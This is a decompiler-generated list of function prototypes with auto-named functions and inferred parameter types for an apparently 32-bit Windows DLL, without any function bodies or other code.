_DWORD *__stdcall sub_1001DB15(_DWORD *a1, int a2);
char __thiscall sub_1001DC81(_DWORD *this);
_DWORD *__thiscall sub_1001DCB2(_DWORD *Block, char a2);
// char __usercall sub_1001DCD1@<al>(int a1@<esi>);
// BOOL __usercall sub_1001DCEA@<eax>(int a1@<eax>);
_DWORD *__stdcall sub_1001DCFD(_DWORD *a1);
void __stdcall sub_1001DD21(void *a1);
_DWORD *__stdcall sub_1001DD41(_DWORD *a1, int pExceptionObject);
// int __usercall sub_1001DD72@<eax>(_DWORD *a1@<edi>);
// _DWORD *__userpurge sub_1001DD82@<eax>(_DWORD *a1@<edi>, _DWORD *a2, int a3);
void __stdcall sub_1001DDC2(int a1);
void __stdcall sub_1001DDFF(_DWORD *a1, int a2, int a3);
// int __usercall sub_1001DE2D@<eax>(_DWORD *a1@<edi>);
// _DWORD *__usercall sub_1001DE86@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// void __usercall sub_1001DEAB(_DWORD *a1@<ecx>, int a2@<edi>);
_DWORD *__stdcall sub_1001DF0D(_DWORD *a1, int pExceptionObject);
int *__thiscall sub_1001DF7D(int *Block, char a2);
_DWORD *__stdcall sub_1001DF9C(_DWORD *a1, int a2);
void __thiscall sub_1001DFCF(int *this);
// BOOL __usercall sub_1001DFF6@<eax>(int a1@<eax>, int a2@<ecx>);
int __thiscall sub_1001E012(void *this);
_DWORD *__stdcall sub_1001E1CB(int a1, _DWORD *a2, int a3);
_DWORD *__stdcall sub_1001E244(int a1, _DWORD *a2, int a3);
char __stdcall sub_1001E2BE(int a1, int a2);
_DWORD *__stdcall sub_1001E30F(int pExceptionObject, _DWORD *a2, int a3);
_DWORD *__stdcall sub_1001E343(int a1, _DWORD *a2, int pExceptionObject, int a4);
_DWORD *__stdcall sub_1001E4AC(int a1, _DWORD *a2);
_DWORD *__thiscall sub_1001E4E1(_DWORD *this, _DWORD *a2);
_DWORD *__stdcall sub_1001E56F(_DWORD *a1, void *Block, int a3);
int *__thiscall sub_1001E5D2(int *Block, char a2);
// _DWORD *__userpurge sub_1001E5F1@<eax>(int a1@<edi>, _DWORD *a2);
// int *__userpurge sub_1001E652@<eax>(int *a1@<esi>, int *Block);
void __thiscall sub_1001E6BD(int *this);
void *__thiscall sub_1001E712(_DWORD *this, void *a2);
// _DWORD *__userpurge sub_1001E75B@<eax>(_DWORD *a1@<edi>, _DWORD *a2);
// bool __usercall sub_1001E7A2@<al>(int a1@<eax>, int a2@<ecx>);
_DWORD *__stdcall sub_1001E7CA(_DWORD *a1, int a2, void *Block);
int *__thiscall sub_1001E82F(int *Block, char a2);
// _DWORD *__userpurge sub_1001E84E@<eax>(int a1@<edi>, _DWORD *a2);
// int *__userpurge sub_1001E8B2@<eax>(int *a1@<esi>, int *Block);
void __thiscall sub_1001E91D(int *this);
void *__thiscall sub_1001E972(_DWORD *this, void *a2);
// _DWORD *__userpurge sub_1001E9BB@<eax>(_DWORD *a1@<edi>, _DWORD *a2);
// BOOL __usercall sub_1001EA02@<eax>(int a1@<eax>, int a2@<ecx>);
_DWORD *__stdcall sub_1001EA29(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1001EA64(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1001EAB6(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1001EAF1(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1001EB43(_DWORD *a1, void *a2, char a3);
_DWORD *__cdecl sub_1001EB76(_DWORD *a1);
int __thiscall sub_1001EBAB(_DWORD *this, int a2);
_DWORD *__cdecl sub_1001EBE1(_DWORD *a1, int a2);
_DWORD *__cdecl sub_1001EC1F(_DWORD *a1, int a2, DWORD a3);
int __cdecl sub_1001EC83(int a1, int a2, char a3);
_DWORD *__cdecl sub_1001EE3A(_DWORD *a1, int a2, int a3, char a4, DWORD a5);
// _DWORD *__usercall sub_1001EE7C@<eax>(DWORD a1@<ebx>, _DWORD *a2, DWORD dwDesiredAccess);
_DWORD *__cdecl sub_1001EED7(_DWORD *a1, int a2, char pExceptionObject);
_DWORD *__cdecl sub_1001EF75(_DWORD *a1, int a2, int *a3, int a4, char pExceptionObject);
DWORD __thiscall sub_1001F01D(_DWORD *this);
int __thiscall sub_1001F079(_DWORD *this);
_DWORD *__thiscall sub_1001F177(_DWORD *this, int a2);
_DWORD *__thiscall sub_1001F1AF(_DWORD *Block, char a2);
bool __thiscall sub_1001F1CE(_DWORD *this, UINT uExitCode);
_DWORD *__thiscall sub_1001F212(_DWORD *this, _DWORD *a2, int pExceptionObject);
_DWORD *__thiscall sub_1001F2A1(_DWORD *this, _DWORD *a2);
int __thiscall sub_1001F386(void *this, int a2, int a3, int a4);
int __thiscall sub_1001F3BC(_DWORD *this, int a2, SIZE_T dwSize, DWORD flProtect, DWORD flAllocationType);
int __thiscall sub_1001F44A(void *this, int a2, char a3, char a4, char a5);
char __thiscall sub_1001F4D4(void *this, int *a2);
_DWORD *__cdecl sub_1001F538(_DWORD *a1, int a2, int a3);
_DWORD *__cdecl sub_1001F6B6(_DWORD *a1, char *a2, char *a3);
_DWORD *__thiscall sub_1001F77B(_DWORD *this, _DWORD *a2, int a3, char *a4, char a5, int Block);
_DWORD *__thiscall sub_1002022F(_DWORD *this, _DWORD *a2, DWORD DesiredAccess);
DWORD __thiscall sub_10020294(_DWORD *this);
DWORD __thiscall sub_100202CF(void *this, int a2);
int __thiscall sub_100203FA(void *this, int a2, int a3);
int __thiscall sub_10020A37(int *this, int a2, int a3);
int __thiscall sub_10020A55(void *this, int a2);
// _DWORD *__usercall sub_10020A83@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_10020ABE(void *this);
// void __usercall sub_10020AE9(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_10020B2C(int a1@<esi>);
int *__stdcall sub_10020B54(int a1, int a2, HANDLE hToken);
LPVOID *__thiscall sub_10020BB3(LPVOID *Block, char a2);
BOOL __thiscall sub_10020BD2(LPVOID *this);
int __thiscall sub_10020C05(_DWORD *this);
int *__cdecl sub_10020C0F(int *a1, int a2);
// void __usercall sub_10020D40(_DWORD *a1@<edi>);
void __thiscall sub_10020DD7(_DWORD *this);
_DWORD *__thiscall sub_10020DE8(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_10020E57(_DWORD *this, char a2);
// void __usercall sub_10020E83(_DWORD *a1@<edi>);
// void __usercall sub_10020F1A(_DWORD *a1@<edi>);
// void __usercall sub_10020FB1(_DWORD *a1@<edi>);
// void __usercall sub_10021048(_DWORD *a1@<esi>, int a2, int a3, int a4, int a5);
_DWORD *__cdecl sub_100210E0(_DWORD *a1);
int *__thiscall sub_10021136(int *this);
_DWORD *__stdcall sub_10021188(_DWORD *a1, int a2, int a3);
void *__thiscall sub_100211CE(void *Block, char a2);
void __thiscall sub_100211ED(int this);
int __thiscall sub_10021245(void *this, _BYTE *a2);
int __thiscall sub_10021271(_DWORD **this, int a2);
int __thiscall sub_10021309(_DWORD **this, int a2, int a3);
int __thiscall sub_10021343(_DWORD **this);
_DWORD *__stdcall sub_1002134B(_DWORD *a1, int a2, int a3);
void *__thiscall sub_100213A4(void *Block, char a2);
int __thiscall sub_100213C3(int this);
int __thiscall sub_10021427(char *this, char a2);
unsigned int __thiscall sub_1002144D(int *this, int *a2);
int __thiscall sub_100214EA(_DWORD **this, int a2, int a3);
int __thiscall sub_10021524(_DWORD **this);
void __thiscall sub_1002152C(int *this);
int *__thiscall sub_10021553(int *Block, char a2);
int *__stdcall sub_10021572(int *a1, void *a2, int a3, volatile LONG *lpAddend, int a5);
void *__thiscall sub_10021648(void *Block, char a2);
void __stdcall sub_10021668(int a1);
_DWORD *__stdcall sub_10021697(_DWORD *a1, int a2, int a3, int a4, void *Block, int a6);
LONG __fastcall sub_100217CC(int a1, _DWORD *a2);
LONG __thiscall sub_1002189D(_DWORD *this, int Src);
int __thiscall sub_1002192E(int this);
int sub_1002198A();
// void __usercall sub_1002199D(int a1@<edi>, int a2@<esi>);
void __thiscall sub_100219E0(_DWORD *this);
void __thiscall sub_10021A05(_DWORD *this, int a2, volatile LONG *lpAddend);
int *__cdecl sub_10021C24(int *a1, void *a2);
_DWORD *__cdecl sub_10021E01(_DWORD *a1, int *a2);
_DWORD *__stdcall sub_10021EFD(_DWORD *a1, void *Block, int a3, volatile LONG *lpAddend);
_DWORD *__stdcall sub_10021FA0(int a1, _DWORD *a2);
LONG __thiscall sub_10021FDD(_DWORD *this, int a2);
int *__thiscall sub_100220AA(_DWORD *this, int *a2, int a3, int a4, int *a5);
// void __userpurge sub_1002219E(int a1@<esi>, int a2, int a3);
// _DWORD *__usercall sub_10022222@<eax>(_DWORD *a1@<esi>);
// _DWORD *__userpurge sub_1002229A@<eax>(_DWORD *a1@<esi>, int a2);
// void __usercall sub_100222D9(_DWORD *a1@<ecx>, int a2@<edi>);
_DWORD *__stdcall sub_10022338(_DWORD *a1, int a2, int a3, int a4);
int *__thiscall sub_10022396(int *Block, char a2);
void __stdcall sub_100223B6(int *a1);
_DWORD *__stdcall sub_100223E4(_DWORD *a1, _DWORD *a2, int a3, int a4);
_DWORD *__stdcall sub_10022475(_DWORD *a1, _DWORD *a2, int a3, int a4);
_DWORD *__thiscall sub_10022507(_DWORD *this, _DWORD *a2, int a3, int a4, int MaxCount);
bool __stdcall sub_100226A2(_DWORD *a1, int a2, int a3, int a4);
int __thiscall sub_10022712(_DWORD *this, int a2);
void __thiscall sub_10022743(_DWORD *this, int a2, int *a3, int a4);
int __thiscall sub_100229BB(_DWORD *this);
int __thiscall sub_10022A4A(_DWORD *this, int pExceptionObject, int a3);
int sub_10022B93();
int __thiscall sub_10022B97(int this, int a2);
int __thiscall sub_10022BC8(int this, int a2);
_DWORD *__thiscall sub_10022BF9(void *this, _DWORD *a2);
void __thiscall sub_10022C49(_DWORD *this);
BOOL __thiscall sub_10022C6E(void *this);
_DWORD *__thiscall sub_10022C87(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10022CDA(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10022D2D(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10022D88(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10022DE3(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_10022E58(void *this, _DWORD *a2, unsigned int pExceptionObject);
void __thiscall sub_10022ECD(_DWORD *this);
int *__thiscall sub_10022EF2(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_10022F5A(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_10022FC2(void *this, int a2);
void __thiscall sub_10022FFA(void *this, int a2, int a3);
void __thiscall sub_10023035(void *this, int a2);
int __thiscall sub_1002306D(void *this, int a2);
int __thiscall sub_100230A9(void *this, int a2);
void __thiscall sub_100230E5(void *this);
_DWORD *__thiscall sub_1002312D(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002314C(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002316C(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002318C(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100231AB(_DWORD *Block, char a2);
// int __usercall sub_100231D0@<eax>(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_10023201(void *this, int a2);
// int __usercall sub_10023234@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__stdcall sub_10023273(_DWORD *a1, int a2);
BOOL __thiscall sub_100232B7(int this);
BOOL __thiscall sub_100232CA(_DWORD *this);
int *__thiscall sub_100232D4(int *this);
void __thiscall sub_1002330F(_DWORD *this);
void __thiscall sub_10023313(_DWORD *this);
void __noreturn sub_10023317(); // weak
void __noreturn sub_10023334(); // weak
void __thiscall sub_10023351(int *this);
_DWORD *__thiscall sub_10023386(void *this, _DWORD *a2, int a3);
void __thiscall sub_100233BA(_DWORD *this);
bool __thiscall sub_100233DF(int this);
BOOL __thiscall sub_100233F6(_DWORD *this);
int __thiscall sub_10023400(int this);
int __thiscall sub_1002343B(int this);
int __thiscall sub_10023471(_DWORD *this);
int __thiscall sub_10023499(int this);
int __thiscall sub_100234D4(int this, int a2);
_DWORD *__thiscall sub_100234F0(void *this, _DWORD *a2, int a3);
void __thiscall sub_10023524(_DWORD *this);
bool __thiscall sub_10023549(int this);
BOOL __thiscall sub_10023560(_DWORD *this);
int __thiscall sub_1002356A(int this);
int __thiscall sub_100235A5(int this);
int __thiscall sub_100235DB(_DWORD *this);
int __thiscall sub_10023603(int this);
int __thiscall sub_1002363E(int this, int a2);
_DWORD *__thiscall sub_1002365A(_DWORD *Block, char a2);
int *__thiscall sub_1002367A(int *Block, char a2);
_DWORD *__thiscall sub_10023699(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100236B8(_DWORD *Block, char a2);
void __stdcall sub_100236D7(_DWORD *a1);
_DWORD *__stdcall sub_10023728(_DWORD *a1);
// _DWORD *__usercall sub_10023799@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
int *__thiscall sub_100237C9(int *this, int *a2);
void __thiscall sub_1002380E(_DWORD *this);
int __thiscall sub_10023860(_DWORD *this);
_DWORD *__thiscall sub_10023864(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_100238CA(int *this, int a2);
int __thiscall sub_100238E5(_DWORD *this, unsigned int a2);
int __thiscall sub_1002393F(_DWORD *this, int a2);
int __thiscall sub_10023960(_DWORD *this, int a2);
char *__thiscall sub_10023981(_DWORD *this, char *a2);
int __thiscall sub_100239AA(int *this);
BOOL __thiscall sub_100239D1(void *this);
int __thiscall sub_100239DC(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10023A21(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10023A93(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10023ABB(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10023ACE(_DWORD *this, int a2, int a3, void *Block);
void __thiscall sub_10023B74(_DWORD *this);
_DWORD *__stdcall sub_10023C7D(_DWORD *a1);
void __thiscall sub_10023CC2(_DWORD *this);
bool __thiscall sub_10023D0D(_DWORD *this, int a2);
char __thiscall sub_10023D4C(_DWORD *this, int a2);
int __thiscall sub_10023DA0(_DWORD *this, int a2);
int __thiscall sub_10023E18(_DWORD *this, int pExceptionObject);
_DWORD *__thiscall sub_10023E72(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10023EA3(_DWORD *this, _DWORD *a2);
int __thiscall sub_10023ED4(_DWORD *this, int a2);
int __thiscall sub_10023EEF(_DWORD *this);
int __thiscall sub_10023F03(_DWORD *this);
_DWORD *__thiscall sub_10023F0B(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10023F44(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10023F7D(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10023FB6(int *this, _DWORD *a2);
// _DWORD *__userpurge sub_10024003@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10024042(void *this);
// _DWORD *__userpurge sub_10024073@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_100240B2(void *this);
// _DWORD *__userpurge sub_100240F1@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10024130(void *this);
_DWORD *__thiscall sub_10024161(_DWORD *Block, char a2);
void __thiscall sub_10024180(_DWORD *this);
_DWORD *__thiscall sub_1002418A(_DWORD *Block, char a2);
_DWORD *__stdcall sub_100241A9(_DWORD *a1);
// _DWORD *__userpurge sub_10024204@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_10024252(_DWORD *a1);
// int __userpurge sub_10024291@<eax>(_DWORD *a1@<edi>, int a2);
// void __usercall sub_10024339(int a1@<esi>);
// void __usercall sub_10024361(int a1@<esi>);
// void __usercall sub_1002439B(int a1@<esi>);
_DWORD *__stdcall sub_100243C3(_DWORD *a1);
// void __usercall sub_100243F8(_DWORD *a1@<edi>, int a2@<esi>);
_DWORD *__stdcall sub_10024472(_DWORD *a1, int a2, int a3);
// _DWORD *__userpurge sub_100244AF@<eax>(_DWORD *a1@<ebx>, _DWORD *a2, int a3);
void __fastcall sub_10024508(int a1, _DWORD *a2);
_DWORD *__stdcall sub_10024641(_DWORD *a1);
void __thiscall sub_10024691(_DWORD *this);
_DWORD *__thiscall sub_100246A3(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_10024712(_DWORD *this, char a2);
int __stdcall sub_1002473F(int a1);
// int __usercall sub_1002475F@<eax>(int a1@<edi>, _DWORD *a2@<esi>);
int __thiscall sub_10024818(void *this, int a2);
int __stdcall sub_100248B3(int a1, int a2, int a3, int a4);
// LONG __userpurge sub_10024986@<eax>(int *a1@<edi>, int a2);
_DWORD *__thiscall sub_10024A03(void *this, _DWORD *a2, unsigned int a3);
int *__stdcall sub_10024A41(int *a1, int a2, int a3, int a4, int a5);
int __stdcall sub_10024AFE(int a1, int a2);
int *__thiscall sub_10024B9B(int *Block, char a2);
BOOL __thiscall sub_10024BBA(int *this);
void __thiscall sub_10024C3A(void *this);
void __stdcall sub_10024C8C(int a1);
// int __userpurge sub_10024CB0@<eax>(unsigned int a1@<ecx>, int a2@<ebx>, unsigned int a3);
void __stdcall sub_10024D82(int a1);
_DWORD *__stdcall sub_10024DA6(int a1, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9);
_DWORD *__thiscall sub_10024E40(int this, _DWORD *a2, unsigned int a3);
// void __userpurge sub_10024EF5(int a1@<ecx>, int a2@<ebx>, int a3@<esi>, int a4, int a5, int a6, int *a7);
void __fastcall sub_10024F6A(int a1, unsigned int a2, void *a3);
unsigned int __fastcall sub_10025071(unsigned int a1, _DWORD **a2);
_DWORD *__stdcall sub_100251DA(_DWORD *a1);
void __thiscall sub_1002522A(_DWORD *this);
_DWORD *__thiscall sub_1002523C(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_100252AB(_DWORD *this, char a2);
int __stdcall sub_100252D8(int a1);
void __stdcall sub_100252F8(int a1, _DWORD *a2, int a3);
// void __userpurge sub_10025332(int *a1@<ebx>, _DWORD *a2, volatile LONG *lpAddend);
int __stdcall sub_100253E7(int *a1, unsigned int a2);
void __stdcall sub_10025457(int *a1, _DWORD *a2, volatile LONG *lpAddend);
int __thiscall sub_100254DC(int this);
int __thiscall sub_10025535(int this);
void *__stdcall sub_1002557E(int a1, void *a2);
_DWORD *__stdcall sub_100255BA(int a1, _DWORD *a2, int a3, int a4);
_DWORD *__stdcall sub_10025663(_DWORD *a1, int a2, int a3, LPSECURITY_ATTRIBUTES lpFileMappingAttributes);
_DWORD *__thiscall sub_100256B9(_DWORD *Block, char a2);
bool __thiscall sub_100256D8(_DWORD *this);
// _DWORD *__usercall sub_10025707@<eax>(_DWORD *a1@<esi>);
_DWORD *__thiscall sub_10025723(_DWORD *Block, char a2);
BOOL __thiscall sub_10025779(_DWORD *this);
void __noreturn sub_100257C8(void); // weak
int sub_10025818();
void __noreturn sub_10025844(void); // weak
int __thiscall sub_1002586E(void *this, int a2, int a3);
int __thiscall sub_100258BB(void *this, int a2, int a3);
int __thiscall sub_10025908(void *this, int a2, int a3);
unsigned int __thiscall sub_1002594E(void *this, int pExceptionObject, int a3);
int __cdecl sub_10025986(int a1, int a2);
// int __usercall sub_100259EE@<eax>(int result@<eax>, int a2, unsigned int a3);
int __stdcall sub_10025A41(int a1, int a2, char a3);
_BYTE *__thiscall sub_10025A7A(_BYTE *Block, char a2);
void __thiscall sub_10025A99(_BYTE *this);
int __thiscall sub_10025ADB(void *this);
int __thiscall sub_10025AE7(_BYTE *this);
int __thiscall sub_10025B0D(void *this);
int __thiscall sub_10025B1D(void *this);
int __thiscall sub_10025B2D(void *this);
int __thiscall sub_10025B39(_DWORD *this);
BOOL __thiscall sub_10025B3D(void *this);
int __thiscall sub_10025B64(void *this);
int __thiscall sub_10025B9D(void *this, int a2, int a3);
int __stdcall sub_10025BDE(int a1);
_BYTE *__thiscall sub_10025C0D(_BYTE *Block, char a2);
void __thiscall sub_10025C2C(_BYTE *this);
void __thiscall sub_10025C70(_BYTE *this);
int __thiscall sub_10025C75(int *this, _DWORD *a2);
void __thiscall sub_10025CDC(void *this, int *a2);
char __thiscall sub_10025D4C(_BYTE *this);
// int __userpurge sub_10025D50@<eax>(int a1@<esi>, void *a2, char a3, BOOL a4, DWORD a5, DWORD a6);
// bool __usercall sub_10025D79@<al>(int a1@<eax>);
// bool __usercall sub_10025DCB@<al>(int a1@<eax>);
// bool __usercall sub_10025DF7@<al>(int a1@<eax>);
// bool __usercall sub_10025E23@<al>(int a1@<eax>);
// _DWORD *__usercall sub_10025E32@<eax>(int a1@<edi>, _DWORD *a2@<esi>);
char __thiscall sub_10025E46(void *this, int a2);
// _DWORD *__usercall sub_10025E7D@<eax>(int a1@<edi>, _DWORD *a2@<esi>);
char __thiscall sub_10025E91(HDC *this);
// _DWORD *__usercall sub_10025ED0@<eax>(_DWORD *a1@<esi>);
char __stdcall sub_10025EE8(int a1);
// _DWORD *__usercall sub_10025F20@<eax>(_DWORD *a1@<esi>);
char __stdcall sub_10025F38(int a1);
// _DWORD *__usercall sub_10025F70@<eax>(_DWORD *a1@<esi>);
// bool __usercall sub_10025F88@<al>(int a1@<eax>);
// _DWORD *__usercall sub_10025F97@<eax>(_DWORD *a1@<esi>);
// bool __usercall sub_10025FAF@<al>(int a1@<eax>);
void __cdecl sub_10025FBF(HANDLE hSourceHandle, BOOL bInheritHandle, DWORD dwProcessId);
void __noreturn sub_1002609C(void); // weak
void __noreturn sub_100260B9(void); // weak
void __noreturn sub_100260D6(void); // weak
_DWORD *__thiscall sub_100261A1(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100261C0(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100261DF(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100261FE(_DWORD *Block, char a2);
bool __thiscall sub_1002621D(_DWORD *this);
// BOOL __usercall sub_1002624E@<eax>(int a1@<eax>);
// char __userpurge sub_10026261@<al>(int a1@<eax>, int a2@<edi>, char a3);
bool __thiscall sub_100262A3(_DWORD *this);
// char __userpurge sub_100262D4@<al>(int a1@<eax>, int a2@<edi>, char a3);
bool __thiscall sub_10026316(_DWORD *this);
// char __userpurge sub_10026347@<al>(int a1@<eax>, int a2@<edi>, char a3);
// char __usercall sub_10026389@<al>(int a1@<eax>, int a2@<edi>);
// char __usercall sub_100263BE@<al>(int a1@<eax>, int a2@<edi>);
bool __thiscall sub_100263F3(_DWORD *this);
// char __usercall sub_10026424@<al>(int a1@<eax>, int a2@<edi>);
// bool __usercall sub_10026459@<al>(int a1@<esi>);
// bool __usercall sub_10026473@<al>(int a1@<esi>);
// bool __usercall sub_1002648D@<al>(int a1@<esi>);
// bool __usercall sub_100264A7@<al>(int a1@<esi>);
// BOOL __usercall sub_100264C1@<eax>(int a1@<eax>);
// BOOL __usercall sub_100264D4@<eax>(int a1@<eax>);
// BOOL __usercall sub_100264E7@<eax>(int a1@<eax>);
HMODULE __cdecl sub_10026526(LPCSTR lpModuleName);
HMODULE __cdecl sub_10026534(LPCWSTR lpModuleName);
HMODULE __cdecl sub_10026542(int a1, int a2);
char *__cdecl sub_10026590(char *lp, int a2);
char *__cdecl sub_100265E5(int a1, int a2, int a3);
// void __usercall sub_1002665C(_DWORD *a1@<esi>, HMODULE hModule);
// _BYTE *__usercall sub_100266D3@<eax>(_BYTE *result@<eax>);
char *__cdecl sub_100266E9(char *lp, LPCSTR lpsz);
void __thiscall sub_100268AE(_DWORD *this);
_DWORD *__stdcall sub_100268EB(_DWORD *a1, void *a2);
void __thiscall sub_10026929(_DWORD *this);
int __stdcall sub_10026950(int, int, int, LPCWSTR lpszUsername, DWORD dwLogonType, DWORD dwLogonProvider); // idb
int __thiscall sub_100269F8(_DWORD *this);
int __thiscall sub_100269FC(_DWORD *this);
int __thiscall sub_10026A3D(_DWORD *this);
// void __userpurge sub_10026A7E(int a1@<eax>, int a2);
_DWORD *__stdcall sub_10026AA8(_DWORD *a1, int a2);
// int __userpurge sub_10026AF2@<eax>(int a1@<eax>, int a2);
_DWORD *__thiscall sub_10026B09(_DWORD *this, _DWORD *a2);
int *__cdecl sub_10026BDE(int *a1);
int *__cdecl sub_10026E26(int *a1);
DWORD __thiscall sub_10026F63(void *this, int a2);
DWORD __thiscall sub_10026F75(void *this, int a2);
// DWORD __userpurge sub_10026F87@<eax>(char a1@<al>, int a2, int a3);
_DWORD *__thiscall sub_10027021(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10027074(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100270C7(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10027122(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002717D(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_100271F2(void *this, _DWORD *a2, unsigned int pExceptionObject);
void __thiscall sub_10027267(_DWORD *this);
int *__thiscall sub_1002728C(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_100272F4(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1002735C(void *this, int a2);
void __thiscall sub_10027394(void *this, int a2, int a3);
void __thiscall sub_100273CF(void *this, int a2);
int __thiscall sub_10027407(void *this, int a2);
int __thiscall sub_10027443(void *this, int a2);
void __thiscall sub_1002747F(void *this);
_DWORD *__thiscall sub_100274CE(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100274ED(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002750D(_DWORD *Block, char a2);
// int __usercall sub_10027532@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_10027576@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_100275A7(void *this, _DWORD *a2, int a3);
void __thiscall sub_100275DB(_DWORD *this);
bool __thiscall sub_10027600(int this);
BOOL __thiscall sub_10027617(_DWORD *this);
int __thiscall sub_10027621(int this);
int __thiscall sub_1002765C(int this);
int __thiscall sub_10027692(_DWORD *this);
int __thiscall sub_100276BA(int this);
int __thiscall sub_100276F5(int this, int a2);
_DWORD *__thiscall sub_10027711(void *this, _DWORD *a2, int a3);
void __thiscall sub_10027745(_DWORD *this);
bool __thiscall sub_1002776A(int this);
BOOL __thiscall sub_10027781(_DWORD *this);
int __thiscall sub_1002778B(int this);
int __thiscall sub_100277C6(int this);
int __thiscall sub_100277FC(_DWORD *this);
int __thiscall sub_10027824(int this);
int __thiscall sub_1002785F(int this, int a2);
_DWORD *__thiscall sub_1002787B(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002789A(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_100278D7@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_10027925(_DWORD *a1);
int *__thiscall sub_10027957(int *this, int *a2);
void __thiscall sub_100279AE(_DWORD *this);
int __thiscall sub_10027A11(_DWORD *this);
int __thiscall sub_10027A15(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_10027A89(int *this, int a2);
int __thiscall sub_10027AA4(_DWORD *this, unsigned int a2);
int __thiscall sub_10027B11(_DWORD *this, int a2);
int __thiscall sub_10027B32(_DWORD *this, int a2);
void __thiscall sub_10027B53(_DWORD *this, unsigned int a2);
int __thiscall sub_10027B8E(int *this);
BOOL __thiscall sub_10027BC7(void *this);
int __thiscall sub_10027BD2(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10027C29(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_10027CA5(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10027CCD(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10027CE0(_DWORD *this, int a2, int a3, void *Block);
void __thiscall sub_10027D86(_DWORD *this);
// _DWORD *__userpurge sub_10027EAF@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10027EEE(void *this);
// _DWORD *__userpurge sub_10027F33@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10027F72(void *this);
_DWORD *__thiscall sub_10027FA3(_DWORD *Block, char a2);
char *__thiscall sub_10027FC2(char *Block, char a2);
_DWORD *__stdcall sub_1002800C(_DWORD *a1);
// void __usercall sub_10028037(_DWORD *a1@<edi>);
// void __usercall sub_100280B2(int a1@<esi>);
// void __usercall sub_100280EC(int a1@<esi>);
_DWORD *__stdcall sub_10028128(_DWORD *a1);
_DWORD *__stdcall sub_1002815A(_DWORD *a1, int a2, int a3, int a4, int a5);
_DWORD *__stdcall sub_100281A2(int a1, _DWORD *a2);
void __cdecl sub_100281D7(_DWORD *a1);
void __noreturn sub_100283EC(void); // weak
_DWORD *__stdcall sub_1002840F(_DWORD *a1, int a2);
_DWORD *__stdcall sub_1002844E(_DWORD *a1);
_DWORD *__stdcall sub_100284B3(_DWORD *a1, int a2, void *a3, void *Block);
// _DWORD *__userpurge sub_10028524@<eax>(int a1@<edi>, _DWORD *a2);
void __thiscall sub_10028590(int *this);
_DWORD *__stdcall sub_100285C3(_DWORD *a1, int a2);
int *__thiscall sub_10028606(int *Block, char a2);
void __thiscall sub_10028625(int *this);
int __stdcall sub_10028686(_DWORD *a1);
// int __usercall sub_10028766@<eax>(_DWORD *a1@<esi>);
_DWORD *__stdcall sub_10028830(_DWORD *a1);
void __thiscall sub_10028867(_DWORD *this);
void *__thiscall sub_100288BE(void *this, int a2);
void *__thiscall sub_100288D3(void *this, int a2);
int __thiscall sub_100288E8(_DWORD *this);
_DWORD *__thiscall sub_100288EC(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10028942(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10028998(int *this, _DWORD *a2);
